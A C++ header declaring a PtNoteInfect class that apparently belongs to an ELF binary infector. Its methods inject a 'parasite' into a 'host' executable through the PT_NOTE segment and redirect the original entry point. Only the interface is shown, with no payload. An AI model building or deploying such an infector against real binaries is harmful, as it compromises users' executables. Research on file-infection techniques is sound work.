#pragma once
#include <elf.h>
#include "common/mmap.hh"

namespace vt::infector {

class PtNoteInfect {
 public:
  size_t injected_host_size();

  bool analyze(const common::Mmap<PROT_READ>& host_mapping,
               const common::Mmap<PROT_READ>& parasite_mapping);

  bool infect(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
              common::Mmap<PROT_READ> parasite_mapping);

 private:
  size_t host_size_;
  size_t parasite_size_;
  Elf64_Addr original_e_entry_;
  Elf64_Off original_pt_note_file_offset_;
  Elf64_Addr parasite_load_address_;
  Elf64_Xword pt_load_alignment_;
  size_t pt_note_to_be_infected_idx_ = 0;
};

}  // namespace vt::infector